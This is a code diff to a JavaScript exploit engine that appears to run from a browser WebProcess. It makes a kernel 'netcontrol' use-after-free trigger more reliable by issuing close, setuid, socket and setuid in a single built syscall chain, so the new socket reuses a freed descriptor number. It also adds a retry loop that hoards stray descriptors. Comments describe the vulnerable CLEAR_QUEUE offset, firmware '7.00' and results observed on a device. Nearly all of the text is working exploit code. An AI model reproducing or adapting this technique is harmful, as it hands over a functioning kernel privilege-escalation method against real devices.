@@ -4032,24 +4032,76 @@ export function makePoopsEngine(X) {
         "; next setuid(1) is irreversible for the boot",
     );
 
-    await sys(PSYS.CLOSE, discard);
+    /* close, setuid, socket, setuid in ONE chain.
+       -----------------------------------------------------------------------
+       7.00's CLEAR_QUEUE matches a queue slot by the FD NUMBER the slot stored
+       at +0x10 (`mov edx,[rdi+0x10] ; cmp edx,[r14]`), so the whole trigger
+       depends on the fresh socket landing on the number the discard socket had.
+       As four separate chain launches there are milliseconds of JS and awaits
+       between the close and the socket, and any other thread in this
+       WebProcess that opens a descriptor in that window takes the number
+       first. Observed on device: discard 122 closed, socket came back 124,
+       CLEAR matched no slot and returned -1, and a netcontrol slot -- one of
+       the two this boot has -- was spent for nothing.
+       One chain closes the window to the length of four syscalls. */
+    await runBuilt("netctrl-sandwich", () => {
+      armRet(4);
+      emit(PSYS.CLOSE, retPtr(0), discard);
+      emit(PSYS.SETUID, retPtr(1), 1);
+      emit(PSYS.SOCKET, retPtr(2), K.AF_UNIX, K.SOCK_STREAM, 0);
+      emit(PSYS.SETUID, retPtr(3), 1);
+    });
     untrack(discard);
-    await sys(PSYS.SETUID, 1);
-    S.setuidCalls++;
-    const us = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
-    if (us.failed) throw new Error("uaf socket failed: " + us.errText);
-    S.uafSock = us.s32;
+    S.setuidCalls += 2;
+    let uafFd = retOf(2);
+    if (uafFd < 0)
+      throw new Error(
+        "uaf socket failed inside the sandwich chain: ret=" +
+          uafFd +
+          " (close=" +
+          retOf(0) +
+          ", setuid=" +
+          retOf(1) +
+          ")",
+      );
+
+    /* Fallback for the case the chain cannot prevent: the number was already
+       gone before we closed it. Hold each wrong descriptor so the allocator
+       cannot hand it straight back, and ask again -- the number is only
+       unavailable while somebody else holds it. Everything that is not the
+       number we need is handed back afterwards. */
+    const strays = [];
+    for (let i = 0; uafFd !== discard && i < 4; ++i) {
+      strays.push(uafFd);
+      await yieldN(2);
+      const again = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
+      if (again.failed) break;
+      uafFd = again.s32;
+    }
+    for (const fd of strays) await sys(PSYS.CLOSE, fd);
+    if (strays.length)
+      flushMark(
+        "NETCTRL-UAF-RETRY",
+        "wanted=" +
+          discard +
+          "-strays=" +
+          strays.join(".") +
+          "-landedOn=" +
+          uafFd,
+      );
+
+    S.uafSock = uafFd;
     S.uafClosed = false;
     S.uafSocks.push(S.uafSock);
     track(S.uafSock);
-    await sys(PSYS.SETUID, 1);
-    S.setuidCalls++;
     flushMark(
       "NETCTRL-UAF",
       "uaf_sock=" +
         S.uafSock +
         "-reusedFdNumber=" +
         (S.uafSock === discard ? "YES" : "NO-" + discard) +
+        "-closeRet=" +
+        retOf(0) +
         "-setuidCalls=" +
         S.setuidCalls,
     );
